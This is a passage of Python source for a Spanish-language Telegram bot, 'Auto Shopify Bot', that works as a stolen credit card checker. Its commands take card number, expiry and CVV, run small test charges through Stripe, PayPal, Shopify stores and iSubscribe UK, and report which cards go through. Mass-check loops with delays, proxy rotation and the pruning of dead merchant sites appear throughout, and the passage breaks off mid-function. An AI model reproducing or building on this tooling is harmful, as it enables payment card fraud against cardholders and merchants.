[ϟ] 𝗚𝗮𝘁𝗲 : {resultado_api['gate_name']}
[ϟ] 𝗦𝘁𝗮𝘁𝘂𝘀 : {status_msg[:40]}
━━━━━━━━━━━━━━━━━━━━━━
[ϟ] 𝗕𝗶𝗻 : {bin_num}
[ϟ] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 : {country_line}
[ϟ] 𝗕𝗮𝗻𝗸 : {bank_name[:30]}
[ϟ] 𝗧𝘆𝗽𝗲 : {tipo_completo} | {tipo_especifico}
━━━━━━━━━━━━━━━━━━━━━━
[ϟ] T/t : {tiempo_str} | Proxy : {proxy_status}
[ϟ] 𝗖𝗵𝗲𝗸𝗲𝗱 𝗯𝘆 : @AutoShopifyBot
[ϟ] 𝗢𝘄𝗻𝗲𝗿 : {user_name}
╚━━━━「𝐀𝐔𝐓𝐎 𝐒𝐇𝐎𝐏𝐈𝐅𝐘 𝐁𝐎𝐓」━━━━╝
"""
    return texto

# ==================== PROXY TESTER ULTRA RÁPIDO ====================

# Semáforo para controlar concurrencia
proxy_semaphore = threading.Semaphore(50)

def test_proxy_rapido(proxy):
    """Prueba un proxy de manera ultra rápida"""
    with proxy_semaphore:
        try:
            start_time = time.time()
            
            partes = proxy.split(':')
            if len(partes) == 4:
                ip, puerto, user, passw = partes
                proxy_dict = {
                    'http': f'http://{user}:{passw}@{ip}:{puerto}',
                    'https': f'https://{user}:{passw}@{ip}:{puerto}'
                }
            else:
                proxy_dict = {
                    'http': f'http://{proxy}',
                    'https': f'https://{proxy}'
                }
            
            response = requests.get(
                'http://httpbin.org/ip',
                proxies=proxy_dict,
                timeout=3
            )
            
            elapsed = time.time() - start_time
            
            if response.status_code == 200:
                if elapsed < 2:
                    return (proxy, 'alive', f"{elapsed:.2f}s")
                else:
                    return (proxy, 'slow', f"{elapsed:.2f}s")
            else:
                return (proxy, 'dead', f"HTTP {response.status_code}")
                
        except requests.exceptions.ConnectTimeout:
            return (proxy, 'dead', "Timeout")
        except requests.exceptions.ProxyError:
            return (proxy, 'dead', "Proxy Error")
        except Exception as e:
            return (proxy, 'dead', str(e)[:20])

@bot.message_handler(commands=['px'])
def cmd_test_proxies_ultra_rapido(message):
    """Versión ULTRA RÁPIDA de test de proxies"""
    proxies = obtener_proxies()
    total = len(proxies)
    
    if not proxies:
        bot.reply_to(message, "📭 No hay proxies guardados para testear")
        return
    
    msg = bot.reply_to(message, f"⚡ INICIANDO TEST ULTRA RÁPIDO")
    
    progress_msg = bot.send_message(
        message.chat.id,
        f"📊 Progreso: 0/{total} proxies\n"
        f"⏱️ Tiempo estimado: {total//10} segundos"
    )
    
    resultados = {'alive': [], 'slow': [], 'dead': []}
    start_total = time.time()
    procesados = 0
    
    with ThreadPoolExecutor(max_workers=50) as executor:
        future_to_proxy = {executor.submit(test_proxy_rapido, proxy): proxy for proxy in proxies}
        
        for future in as_completed(future_to_proxy):
            try:
                proxy, status, info = future.result(timeout=4)
                resultados[status].append((proxy, info))
                actualizar_status_proxy(proxy, status, info)
            except:
                proxy = future_to_proxy[future]
                resultados['dead'].append((proxy, "Error"))
                actualizar_status_proxy(proxy, 'dead', "Error")
            
            procesados += 1
            
            if procesados % 10 == 0 or procesados == total:
                elapsed = time.time() - start_total
                porcentaje = (procesados / total) * 100
                barra = "█" * int(porcentaje/5) + "░" * (20 - int(porcentaje/5))
                
                try:
                    bot.edit_message_text(
                        f"⚡ TEST ULTRA RÁPIDO DE PROXIES\n"
                        f"{barra}\n"
                        f"📊 Progreso: {procesados}/{total} ({porcentaje:.1f}%)\n"
                        f"✅ Vivos: {len(resultados['alive'])}  🐢 Lentos: {len(resultados['slow'])}  ❌ Muertos: {len(resultados['dead'])}",
                        message.chat.id,
                        progress_msg.message_id
                    )
                except:
                    pass
    
    tiempo_total = time.time() - start_total
    minutos = int(tiempo_total // 60)
    segundos = int(tiempo_total % 60)
    
    texto_final = f"""✅ TEST ULTRA RÁPIDO COMPLETADO
━━━━━━━━━━━━━━━━━━━━━━
📊 RESULTADOS FINALES:

✅ Vivos (<2s): {len(resultados['alive'])}
🐢 Lentos (>2s): {len(resultados['slow'])}
❌ Muertos: {len(resultados['dead'])}
━━━━━━━━━━━━━━━━━━━━━━
⚡ Velocidad: {total/tiempo_total:.1f} proxies/seg
⏱️ Tiempo total: {minutos}m {segundos}s"""
    
    try:
        bot.edit_message_text(texto_final, message.chat.id, progress_msg.message_id)
    except:
        bot.send_message(message.chat.id, texto_final)

# ==================== COMANDOS INDIVIDUALES ====================

@bot.message_handler(commands=['start', 'menu'])
def cmd_menu(message):
    texto = """
╔════════════════════════════╗
║    🚀 AUTO SHOPIFY BOT    ║
╠════════════════════════════╣
║  Gates disponibles:         ║
║  • /check5 - Stripe $1     ║
║  • /pp - PayPal $10        ║
║  • /pp2 - PayPal $0.10     ║
║  • /pp3 - PayPal $1        ║
║  • /sh - AutoShopify       ║
║  • /uk - iSubscribe £4     ║
║                            ║
║  📦 Masivos:               ║
║  • /mass - Stripe          ║
║  • /mpp - PayPal ($0.10)   ║
║  • /msh - Shopify          ║
║  • /muk - iSubscribe UK    ║
║                            ║
║  ⚡ Otros:                  ║
║  • /px - Test proxies      ║
║  • /cleansites - Limpiar   ║
╚════════════════════════════╝
    """
    bot.send_message(message.chat.id, texto, reply_markup=menu_principal())

def menu_principal():
    markup = types.InlineKeyboardMarkup(row_width=2)
    btn1 = types.InlineKeyboardButton("💳 Stripe $1", callback_data='menu_stripe')
    btn2 = types.InlineKeyboardButton("💰 PayPal", callback_data='menu_paypal')
    btn3 = types.InlineKeyboardButton("🛍️ Shopify", callback_data='menu_shopify')
    btn4 = types.InlineKeyboardButton("🇬🇧 iSubscribe UK", callback_data='menu_isubscribe')
    btn5 = types.InlineKeyboardButton("📊 Estadísticas", callback_data='menu_stats')
    btn6 = types.InlineKeyboardButton("🌐 Proxies", callback_data='menu_proxies')
    markup.add(btn1, btn2, btn3, btn4, btn5, btn6)
    return markup

@bot.message_handler(commands=['check5'])
def cmd_check5(message):
    try:
        cc = message.text.split()[1]
        if len(cc.split('|')) != 4:
            bot.reply_to(message, "❌ Formato: /check5 NUMERO|MES|AÑO|CVV")
            return
        
        msg = bot.reply_to(message, "🔄 Verificando con Stripe $1 No AVS...")
        bin_info = consultar_bin(cc[:6])
        user_name = message.from_user.first_name or "User"
        
        resultado = verificar_api_stripe_noavs(cc, proxy_actual)
        
        if resultado:
            guardar_historial(cc, resultado['proxy'], 'Stripe $1 No AVS', resultado['amount'],
                            resultado['status'], resultado['message'], resultado['gates'], bin_info)
            texto = formato_check_premium(cc, resultado, bin_info, resultado['tiempo'], user_name, "Stripe $1 No AVS")
            bot.edit_message_text(texto, message.chat.id, msg.message_id)
        else:
            bot.edit_message_text("❌ Error en verificación", message.chat.id, msg.message_id)
    except IndexError:
        bot.reply_to(message, "❌ Uso: /check5 NUMERO|MES|AÑO|CVV")

@bot.message_handler(commands=['pp'])
def cmd_pp(message):
    try:
        cc = message.text.split()[1]
        if len(cc.split('|')) != 4:
            bot.reply_to(message, "❌ Formato: /pp NUMERO|MES|AÑO|CVV")
            return
        
        msg = bot.reply_to(message, "🔄 Verificando con PayPal $10...")
        bin_info = consultar_bin(cc[:6])
        user_name = message.from_user.first_name or "User"
        
        resultado = verificar_api_paypal(cc, gate=1, proxy=proxy_actual)
        
        if resultado:
            guardar_historial(cc, resultado['proxy'], 'PayPal $10', resultado['amount'],
                            resultado['status'], resultado['message'], resultado['gates'], bin_info)
            texto = formato_check_premium(cc, resultado, bin_info, resultado['tiempo'], user_name, "PayPal $10")
            bot.edit_message_text(texto, message.chat.id, msg.message_id)
        else:
            bot.edit_message_text("❌ Error en verificación", message.chat.id, msg.message_id)
    except IndexError:
        bot.reply_to(message, "❌ Uso: /pp NUMERO|MES|AÑO|CVV")

@bot.message_handler(commands=['pp2'])
def cmd_pp2(message):
    try:
        cc = message.text.split()[1]
        if len(cc.split('|')) != 4:
            bot.reply_to(message, "❌ Formato: /pp2 NUMERO|MES|AÑO|CVV")
            return
        
        msg = bot.reply_to(message, "🔄 Verificando con PayPal $0.10...")
        bin_info = consultar_bin(cc[:6])
        user_name = message.from_user.first_name or "User"
        
        resultado = verificar_api_paypal(cc, gate=2, proxy=proxy_actual)
        
        if resultado:
            guardar_historial(cc, resultado['proxy'], 'PayPal $0.10', resultado['amount'],
                            resultado['status'], resultado['message'], resultado['gates'], bin_info)
            texto = formato_check_premium(cc, resultado, bin_info, resultado['tiempo'], user_name, "PayPal $0.10")
            bot.edit_message_text(texto, message.chat.id, msg.message_id)
        else:
            bot.edit_message_text("❌ Error en verificación", message.chat.id, msg.message_id)
    except IndexError:
        bot.reply_to(message, "❌ Uso: /pp2 NUMERO|MES|AÑO|CVV")

@bot.message_handler(commands=['pp3'])
def cmd_pp3(message):
    try:
        cc = message.text.split()[1]
        if len(cc.split('|')) != 4:
            bot.reply_to(message, "❌ Formato: /pp3 NUMERO|MES|AÑO|CVV")
            return
        
        msg = bot.reply_to(message, "🔄 Verificando con PayPal $1...")
        bin_info = consultar_bin(cc[:6])
        user_name = message.from_user.first_name or "User"
        
        resultado = verificar_api_paypal(cc, gate=3, proxy=proxy_actual)
        
        if resultado:
            guardar_historial(cc, resultado['proxy'], 'PayPal $1', resultado['amount'],
                            resultado['status'], resultado['message'], resultado['gates'], bin_info)
            texto = formato_check_premium(cc, resultado, bin_info, resultado['tiempo'], user_name, "PayPal $1")
            bot.edit_message_text(texto, message.chat.id, msg.message_id)
        else:
            bot.edit_message_text("❌ Error en verificación", message.chat.id, msg.message_id)
    except IndexError:
        bot.reply_to(message, "❌ Uso: /pp3 NUMERO|MES|AÑO|CVV")

@bot.message_handler(commands=['sh'])
def cmd_sh(message):
    try:
        partes = message.text.split()
        cc = partes[1]
        
        if len(cc.split('|')) != 4:
            bot.reply_to(message, "❌ Formato: /sh NUMERO|MES|AÑO|CVV")
            return
        
        sitios = obtener_sitios()
        if not sitios:
            bot.reply_to(message, "❌ No hay sitios guardados")
            return
        
        if len(partes) == 3:
            url = partes[2]
            if url not in sitios:
                bot.reply_to(message, "❌ Sitio no encontrado")
                return
        else:
            url = random.choice(sitios)
        
        msg = bot.reply_to(message, f"🔄 Verificando con AutoShopify...\nSitio: {url[:30]}...")
        bin_info = consultar_bin(cc[:6])
        user_name = message.from_user.first_name or "User"
        
        resultado = verificar_api_autoshopify(cc, url, proxy_actual)
        
        if resultado:
            guardar_historial(cc, resultado['proxy'], f"Shopify ${resultado['amount']}", resultado['amount'],
                            resultado['status'], resultado['message'], resultado['gates'], bin_info)
            actualizar_estadisticas_sitio(url, resultado['success'])
            texto = formato_check_premium(cc, resultado, bin_info, resultado['tiempo'], user_name, "Shopify")
            bot.edit_message_text(texto, message.chat.id, msg.message_id)
        else:
            bot.edit_message_text("❌ Error en verificación", message.chat.id, msg.message_id)
    except IndexError:
        bot.reply_to(message, "❌ Uso: /sh NUMERO|MES|AÑO|CVV [URL]")

@bot.message_handler(commands=['uk'])
def cmd_uk(message):
    """
    Verificar con iSubscribe UK (£4.00) - NUEVO GATEWAY
    """
    global proxy_actual
    
    try:
        cc = message.text.split()[1]
        
        if len(cc.split('|')) != 4:
            bot.reply_to(message, "❌ Formato: /uk NUMERO|MES|AÑO|CVV")
            return
        
        msg = bot.reply_to(message, "🇬🇧 Procesando cargo de £4.00 GBP...\n⏱️ Tiempo estimado: 5-10 segundos")
        
        bin_info = consultar_bin(cc[:6])
        user_name = message.from_user.first_name or "User"
        
        resultado = verificar_isubscribe(cc, proxy_actual)
        
        if resultado:
            guardar_historial(cc, resultado['proxy'], 'iSubscribe UK £4', resultado['amount'],
                            resultado['status'], resultado['message'], 'isubscribe uk', bin_info)
            texto = formato_check_premium(cc, resultado, bin_info, resultado['tiempo'], user_name, "iSubscribe UK £4")
            bot.edit_message_text(texto, message.chat.id, msg.message_id)
        else:
            bot.edit_message_text("❌ Error en verificación", message.chat.id, msg.message_id)
        
    except IndexError:
        bot.reply_to(message, "❌ Uso: /uk NUMERO|MES|AÑO|CVV")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

# ==================== COMANDOS MASIVOS ====================

@bot.message_handler(commands=['mass'])
def cmd_mass_stripe(message):
    """Verificación masiva con Stripe $1 No AVS"""
    tarjetas = obtener_todas_tarjetas()
    
    if not tarjetas:
        bot.reply_to(message, "📭 No hay tarjetas guardadas")
        return
    
    texto = message.text.split()
    delay = 2
    notificar_cada = 10
    
    for i, arg in enumerate(texto):
        if arg == '--delay' and i+1 < len(texto):
            try:
                delay = int(texto[i+1])
            except:
                pass
        elif arg == '--notificar' and i+1 < len(texto):
            try:
                notificar_cada = int(texto[i+1])
            except:
                pass
    
    task_id = f"mass_{datetime.now().strftime('%Y%m%d%H%M%S')}_{random.randint(1000,9999)}"
    
    active_tasks[task_id] = {'chat_id': message.chat.id, 'cancel': False}
    
    config = f"""📋 VERIFICACIÓN MASIVA STRIPE $1 NO AVS
━━━━━━━━━━━━━━━━━━━━━━
📌 Tarjetas: {len(tarjetas)}
⏱️ Delay: {delay}s
🔔 Notificar: cada {notificar_cada}
🆔 ID: {task_id}

/cancelar_{task_id} - Cancelar"""
    
    bot.reply_to(message, config)
    
    thread = Thread(target=procesar_masivo_stripe, args=(task_id, message.chat.id, delay, notificar_cada))
    thread.daemon = True
    thread.start()

def procesar_masivo_stripe(task_id, chat_id, delay, notificar_cada):
    cards = [c[0] for c in obtener_todas_tarjetas()]
    total = len(cards)
    
    if total == 0:
        bot.send_message(chat_id, "📭 No hay tarjetas")
        return
    
    msg = bot.send_message(chat_id, "🔄 Iniciando verificación Stripe...")
    
    resultados = {'success': 0, 'failed': 0, 'error': 0}
    detalles = []
    start_time = time.time()
    
    for i, card in enumerate(cards, 1):
        if task_id in active_tasks and active_tasks[task_id].get('cancel'):
            bot.edit_message_text("🛑 Cancelado", chat_id, msg.message_id)
            break
        
        bin_info = consultar_bin(card[:6])
        resultado = verificar_api_stripe_noavs(card, None)
        
        if resultado:
            guardar_historial(card, resultado['proxy'], 'Stripe $1 No AVS', resultado['amount'],
                            resultado['status'], resultado['message'], resultado['gates'], bin_info)
            
            if resultado['status'] == 'success':
                resultados['success'] += 1
                emoji = "✅"
            elif resultado['status'] == 'failed':
                resultados['failed'] += 1
                emoji = "❌"
            else:
                resultados['error'] += 1
                emoji = "⚠️"
            
            detalles.append(f"{emoji} {card} | {resultado['status']} | {resultado['message'][:50]}")
        
        if i % notificar_cada == 0 or i == total:
            porcentaje = (i / total) * 100
            barra = "█" * int(porcentaje/10) + "░" * (10 - int(porcentaje/10))
            
            texto = f"""📊 PROGRESO: {i}/{total}
{barra} {porcentaje:.0f}%

✅ Aprobadas: {resultados['success']}
❌ Declinadas: {resultados['failed']}
⚠️ Errores: {resultados['error']}"""
            
            try:
                bot.edit_message_text(texto, chat_id, msg.message_id)
            except:
                pass
        
        if delay > 0 and i < total:
            time.sleep(delay)
    
    tiempo_total = time.time() - start_time
    minutos = int(tiempo_total // 60)
    segundos = int(tiempo_total % 60)
    
    filename = f"resultados_stripe_{task_id}.txt"
    with open(filename, 'w') as f:
        f.write(f"RESULTADOS STRIPE $1 NO AVS\n")
        f.write(f"Fecha: {datetime.now()}\n")
        f.write(f"Total: {total}\n")
        f.write(f"Tiempo: {minutos}m {segundos}s\n\n")
        f.write(f"✅ Aprobadas: {resultados['success']}\n")
        f.write(f"❌ Declinadas: {resultados['failed']}\n")
        f.write(f"⚠️ Errores: {resultados['error']}\n\n")
        for d in detalles:
            f.write(f"{d}\n")
    
    texto_final = f"""✅ VERIFICACIÓN STRIPE COMPLETADA
━━━━━━━━━━━━━━━━━━━━━━
📊 RESULTADOS:
✅ Aprobadas: {resultados['success']}
❌ Declinadas: {resultados['failed']}
⚠️ Errores: {resultados['error']}
⏱️ Tiempo: {minutos}m {segundos}s"""
    
    try:
        bot.edit_message_text(texto_final, chat_id, msg.message_id)
    except:
        bot.send_message(chat_id, texto_final)
    
    with open(filename, 'rb') as f:
        bot.send_document(chat_id, f)
    
    os.remove(filename)
    time.sleep(300)
    if task_id in active_tasks:
        del active_tasks[task_id]

@bot.message_handler(commands=['mpp'])
def cmd_mass_paypal(message):
    """Verificación masiva con PayPal $0.10"""
    tarjetas = obtener_todas_tarjetas()
    
    if not tarjetas:
        bot.reply_to(message, "📭 No hay tarjetas guardadas")
        return
    
    texto = message.text.split()
    delay = 2
    notificar_cada = 10
    
    for i, arg in enumerate(texto):
        if arg == '--delay' and i+1 < len(texto):
            try:
                delay = int(texto[i+1])
            except:
                pass
        elif arg == '--notificar' and i+1 < len(texto):
            try:
                notificar_cada = int(texto[i+1])
            except:
                pass
    
    task_id = f"mpp_{datetime.now().strftime('%Y%m%d%H%M%S')}_{random.randint(1000,9999)}"
    
    active_tasks[task_id] = {'chat_id': message.chat.id, 'cancel': False}
    
    config = f"""💰 VERIFICACIÓN MASIVA PAYPAL $0.10
━━━━━━━━━━━━━━━━━━━━━━
📌 Tarjetas: {len(tarjetas)}
⏱️ Delay: {delay}s
🔔 Notificar: cada {notificar_cada}
🆔 ID: {task_id}

/cancelar_{task_id} - Cancelar"""
    
    bot.reply_to(message, config)
    
    thread = Thread(target=procesar_masivo_paypal, args=(task_id, message.chat.id, delay, notificar_cada))
    thread.daemon = True
    thread.start()

def procesar_masivo_paypal(task_id, chat_id, delay, notificar_cada):
    cards = [c[0] for c in obtener_todas_tarjetas()]
    total = len(cards)
    
    if total == 0:
        bot.send_message(chat_id, "📭 No hay tarjetas")
        return
    
    msg = bot.send_message(chat_id, "🔄 Iniciando verificación PayPal $0.10...")
    
    resultados = {'success': 0, 'failed': 0, 'error': 0}
    detalles = []
    start_time = time.time()
    
    for i, card in enumerate(cards, 1):
        if task_id in active_tasks and active_tasks[task_id].get('cancel'):
            bot.edit_message_text("🛑 Cancelado", chat_id, msg.message_id)
            break
        
        bin_info = consultar_bin(card[:6])
        resultado = verificar_api_paypal(card, gate=2, proxy=None)
        
        if resultado:
            guardar_historial(card, resultado['proxy'], 'PayPal $0.10', resultado['amount'],
                            resultado['status'], resultado['message'], resultado['gates'], bin_info)
            
            if resultado['status'] == 'success':
                resultados['success'] += 1
                emoji = "✅"
            elif resultado['status'] == 'failed':
                resultados['failed'] += 1
                emoji = "❌"
            else:
                resultados['error'] += 1
                emoji = "⚠️"
            
            detalles.append(f"{emoji} {card} | {resultado['status']} | {resultado['message'][:50]}")
        
        if i % notificar_cada == 0 or i == total:
            porcentaje = (i / total) * 100
            barra = "█" * int(porcentaje/10) + "░" * (10 - int(porcentaje/10))
            
            texto = f"""📊 PROGRESO: {i}/{total}
{barra} {porcentaje:.0f}%

✅ Aprobadas: {resultados['success']}
❌ Declinadas: {resultados['failed']}
⚠️ Errores: {resultados['error']}"""
            
            try:
                bot.edit_message_text(texto, chat_id, msg.message_id)
            except:
                pass
        
        if delay > 0 and i < total:
            time.sleep(delay)
    
    tiempo_total = time.time() - start_time
    minutos = int(tiempo_total // 60)
    segundos = int(tiempo_total % 60)
    
    filename = f"resultados_paypal_{task_id}.txt"
    with open(filename, 'w') as f:
        f.write(f"RESULTADOS PAYPAL $0.10\n")
        f.write(f"Fecha: {datetime.now()}\n")
        f.write(f"Total: {total}\n")
        f.write(f"Tiempo: {minutos}m {segundos}s\n\n")
        f.write(f"✅ Aprobadas: {resultados['success']}\n")
        f.write(f"❌ Declinadas: {resultados['failed']}\n")
        f.write(f"⚠️ Errores: {resultados['error']}\n\n")
        for d in detalles:
            f.write(f"{d}\n")
    
    texto_final = f"""✅ VERIFICACIÓN PAYPAL COMPLETADA
━━━━━━━━━━━━━━━━━━━━━━
📊 RESULTADOS:
✅ Aprobadas: {resultados['success']}
❌ Declinadas: {resultados['failed']}
⚠️ Errores: {resultados['error']}
⏱️ Tiempo: {minutos}m {segundos}s"""
    
    try:
        bot.edit_message_text(texto_final, chat_id, msg.message_id)
    except:
        bot.send_message(chat_id, texto_final)
    
    with open(filename, 'rb') as f:
        bot.send_document(chat_id, f)
    
    os.remove(filename)
    time.sleep(300)
    if task_id in active_tasks:
        del active_tasks[task_id]

@bot.message_handler(commands=['msh'])
def cmd_mass_shopify(message):
    """Verificación masiva con AutoShopify"""
    tarjetas = obtener_todas_tarjetas()
    sitios = obtener_sitios()
    
    if not tarjetas:
        bot.reply_to(message, "📭 No hay tarjetas guardadas")
        return
    
    if not sitios:
        bot.reply_to(message, "📭 No hay sitios guardados")
        return
    
    texto = message.text.split()
    delay = 3
    notificar_cada = 10
    
    for i, arg in enumerate(texto):
        if arg == '--delay' and i+1 < len(texto):
            try:
                delay = int(texto[i+1])
            except:
                pass
        elif arg == '--notificar' and i+1 < len(texto):
            try:
                notificar_cada = int(texto[i+1])
            except:
                pass
    
    task_id = f"msh_{datetime.now().strftime('%Y%m%d%H%M%S')}_{random.randint(1000,9999)}"
    
    active_tasks[task_id] = {'chat_id': message.chat.id, 'cancel': False}
    
    config = f"""🛍️ VERIFICACIÓN MASIVA SHOPIFY
━━━━━━━━━━━━━━━━━━━━━━
📌 Tarjetas: {len(tarjetas)}
🌐 Sitios: {len(sitios)}
⏱️ Delay: {delay}s
🔔 Notificar: cada {notificar_cada}
🆔 ID: {task_id}

/cancelar_{task_id} - Cancelar"""
    
    bot.reply_to(message, config)
    
    thread = Thread(target=procesar_masivo_shopify, args=(task_id, message.chat.id, delay, notificar_cada))
    thread.daemon = True
    thread.start()

def procesar_masivo_shopify(task_id, chat_id, delay, notificar_cada):
    cards = [c[0] for c in obtener_todas_tarjetas()]
    sitios = obtener_sitios()
    total = len(cards)
    total_sitios = len(sitios)
    
    if total == 0 or total_sitios == 0:
        bot.send_message(chat_id, "📭 No hay datos")
        return
    
    msg = bot.send_message(chat_id, "🔄 Iniciando verificación Shopify...")
    
    resultados = {'success': 0, 'failed': 0, 'error': 0, 'sitios_eliminados': 0}
    detalles = []
    start_time = time.time()
    sitio_index = 0
    sitios_a_eliminar = []
    
    for i, card in enumerate(cards, 1):
        if task_id in active_tasks and active_tasks[task_id].get('cancel'):
            bot.edit_message_text("🛑 Cancelado", chat_id, msg.message_id)
            break
        
        sitio = sitios[sitio_index % total_sitios]
        sitio_index += 1
        
        bin_info = consultar_bin(card[:6])
        resultado = verificar_api_autoshopify(card, sitio, None)
        
        if resultado:
            mensaje = resultado.get('message', '').lower()
            respuestas_muertas = ['py id empty', '404', 'not found']
            
            if any(rm in mensaje for rm in respuestas_muertas):
                if sitio not in sitios_a_eliminar:
                    sitios_a_eliminar.append(sitio)
                    resultados['sitios_eliminados'] += 1
            
            if sitio not in sitios_a_eliminar:
                guardar_historial(card, resultado['proxy'], f"Shopify ${resultado['amount']}",
                                resultado['amount'], resultado['status'], resultado['message'],
                                resultado['gates'], bin_info)
                actualizar_estadisticas_sitio(sitio, resultado['success'])
                
                if resultado['status'] == 'success':
                    resultados['success'] += 1
                    emoji = "✅"
                elif resultado['status'] == 'failed':
                    resultados['failed'] += 1
                    emoji = "❌"
                else:
                    resultados['error'] += 1
                    emoji = "⚠️"
                
                detalles.append(f"{emoji} {card} | Sitio: {sitio[:30]}... | {resultado['status']}")
        
        if i % notificar_cada == 0 or i == total:
            porcentaje = (i / total) * 100
            barra = "█" * int(porcentaje/10) + "░" * (10 - int(porcentaje/10))
            
            texto = f"""📊 PROGRESO: {i}/{total}
{barra} {porcentaje:.0f}%

✅ Aprobadas: {resultados['success']}
❌ Declinadas: {resultados['failed']}
⚠️ Errores: {resultados['error']}
🗑️ Sitios eliminados: {resultados['sitios_eliminados']}"""
            
            try:
                bot.edit_message_text(texto, chat_id, msg.message_id)
            except:
                pass
        
        if delay > 0 and i < total:
            time.sleep(delay)
    
    if sitios_a_eliminar:
        conn = get_db_connection()
        cursor = conn.cursor()
        for sitio in sitios_a_eliminar:
            cursor.execute("DELETE FROM sitios WHERE url = ?", (sitio,))
        conn.commit()
        conn.close()
        bot.send_message(chat_id, f"🗑️ Se eliminaron {len(sitios_a_eliminar)} sitios")
    
    tiempo_total = time.time() - start_time
    minutos = int(tiempo_total // 60)
    segundos = int(tiempo_total % 60)
    
    filename = f"resultados_shopify_{task_id}.txt"
    with open(filename, 'w') as f:
        f.write(f"RESULTADOS SHOPIFY\n")
        f.write(f"Fecha: {datetime.now()}\n")
        f.write(f"Total: {total}\n")
        f.write(f"Sitios eliminados: {resultados['sitios_eliminados']}\n")
        f.write(f"Tiempo: {minutos}m {segundos}s\n\n")
        f.write(f"✅ Aprobadas: {resultados['success']}\n")
        f.write(f"❌ Declinadas: {resultados['failed']}\n")
        f.write(f"⚠️ Errores: {resultados['error']}\n\n")
        for d in detalles:
            f.write(f"{d}\n")
    
    texto_final = f"""✅ VERIFICACIÓN SHOPIFY COMPLETADA
━━━━━━━━━━━━━━━━━━━━━━
📊 RESULTADOS:
✅ Aprobadas: {resultados['success']}
❌ Declinadas: {resultados['failed']}
⚠️ Errores: {resultados['error']}
🗑️ Sitios eliminados: {resultados['sitios_eliminados']}
⏱️ Tiempo: {minutos}m {segundos}s"""
    
    try:
        bot.edit_message_text(texto_final, chat_id, msg.message_id)
    except:
        bot.send_message(chat_id, texto_final)
    
    with open(filename, 'rb') as f:
        bot.send_document(chat_id, f)
    
    os.remove(filename)
    time.sleep(300)
    if task_id in active_tasks:
        del active_tasks[task_id]

# ==================== NUEVO COMANDO MASIVO iSubscribe UK ====================

@bot.message_handler(commands=['muk'])
def cmd_mass_isubscribe(message):
    """
    Verificación masiva con iSubscribe UK (£4.00) - NUEVO
    """
    tarjetas = obtener_todas_tarjetas()
    
    if not tarjetas:
        bot.reply_to(message, "📭 No hay tarjetas guardadas")
        return
    
    texto = message.text.split()
    delay = 3
    notificar_cada = 10
    
    for i, arg in enumerate(texto):
        if arg == '--delay' and i+1 < len(texto):
            try:
                delay = int(texto[i+1])
            except:
                pass
        elif arg == '--notificar' and i+1 < len(texto):
            try:
                notificar_cada = int(texto[i+1])
            except:
                pass
    
    task_id = f"muk_{datetime.now().strftime('%Y%m%d%H%M%S')}_{random.randint(1000,9999)}"
    
    active_tasks[task_id] = {'chat_id': message.chat.id, 'cancel': False}
    
    config = f"""🇬🇧 VERIFICACIÓN MASIVA iSubscribe UK (£4.00)
━━━━━━━━━━━━━━━━━━━━━━
📌 Tarjetas: {len(tarjetas)}
⏱️ Delay: {delay}s
🔔 Notificar: cada {notificar_cada}
🆔 ID: {task_id}

/cancelar_{task_id} - Cancelar"""
    
    bot.reply_to(message, config)
    
    thread = Thread(target=procesar_masivo_isubscribe, args=(task_id, message.chat.id, delay, notificar_cada))
    thread.daemon = True
    thread.start()

def procesar_masivo_isubscribe(task_id, chat_id, delay, notificar_cada):
    cards = [c[0] for c in obtener_todas_tarjetas()]
    total = len(cards)
    
    if total == 0:
        bot.send_message(chat_id, "📭 No hay tarjetas")
        return
    
    msg = bot.send_message(chat_id, "🇬🇧 Iniciando verificación iSubscribe UK...")
    
    resultados = {'success': 0, 'failed': 0, 'error': 0}
    detalles = []
    start_time = time.time()
    
    for i, card in enumerate(cards, 1):
        if task_id in active_tasks and active_tasks[task_id].get('cancel'):
            bot.edit_message_text("🛑 Cancelado", chat_id, msg.message_id)
            break
        
        bin_info = consultar_bin(card[:6])
        resultado = verificar_isubscribe(card, proxy_actual)
        
        if resultado:
            guardar_historial(card, resultado['proxy'], 'iSubscribe UK £4', resultado['amount'],
                            resultado['status'], resultado['message'], 'isubscribe uk', bin_info)
            
            if resultado['status'] == 'success':
                resultados['success'] += 1
                emoji = "✅"
            elif resultado['status'] == 'failed':
                resultados['failed'] += 1
                emoji = "❌"
            else:
                resultados['error'] += 1
                emoji = "⚠️"
            
            detalles.append(f"{emoji} {card} | {resultado['status']} | {resultado['message'][:50]} | {resultado['tiempo']}s")
        
        if i % notificar_cada == 0 or i == total:
            porcentaje = (i / total) * 100
            barra = "█" * int(porcentaje/10) + "░" * (10 - int(porcentaje/10))
            
            texto = f"""🇬🇧 PROGRESO iSubscribe UK: {i}/{total}
{barra} {porcentaje:.0f}%

✅ Aprobadas: {resultados['success']}
❌ Declinadas: {resultados['failed']}
⚠️ Errores: {resultados['error']}"""
            
            try:
                bot.edit_message_text(texto, chat_id, msg.message_id)
            except:
                pass
        
        if delay > 0 and i < total:
            time.sleep(delay)
    
    tiempo_total = time.time() - start_time
    minutos = int(tiempo_total // 60)
    segundos = int(tiempo_total % 60)
    
    filename = f"resultados_isubscribe_{task_id}.txt"
    with open(filename, 'w', encoding='utf-8') as f:
        f.write(f"RESULTADOS iSubscribe UK (£4.00)\n")
        f.write(f"Fecha: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"Total: {total}\n")
        f.write(f"Tiempo: {minutos}m {segundos}s\n\n")
        f.write(f"✅ Aprobadas: {resultados['success']}\n")
        f.write(f"❌ Declinadas: {resultados['failed']}\n")
        f.write(f"⚠️ Errores: {resultados['error']}\n\n")
        for d in detalles:
            f.write(f"{d}\n")
    
    texto_final = f"""✅ VERIFICACIÓN iSubscribe UK COMPLETADA
━━━━━━━━━━━━━━━━━━━━━━
📊 RESULTADOS:
✅ Aprobadas: {resultados['success']}
❌ Declinadas: {resultados['failed']}
⚠️ Errores: {resultados['error']}
⏱️ Tiempo: {minutos}m {segundos}s"""
    
    try:
        bot.edit_message_text(texto_final, chat_id, msg.message_id)
    except:
        bot.send_message(chat_id, texto_final)
    
    with open(filename, 'rb') as f:
        bot.send_document(chat_id, f, caption=f"🇬🇧 Resultados iSubscribe UK - {total} tarjetas")
    
    os.remove(filename)
    time.sleep(300)
    if task_id in active_tasks:
        del active_tasks[task_id]

# ==================== OTROS COMANDOS ====================

@bot.message_handler(commands=['proxy'])
def cmd_proxy(message):
    global proxy_actual
    try:
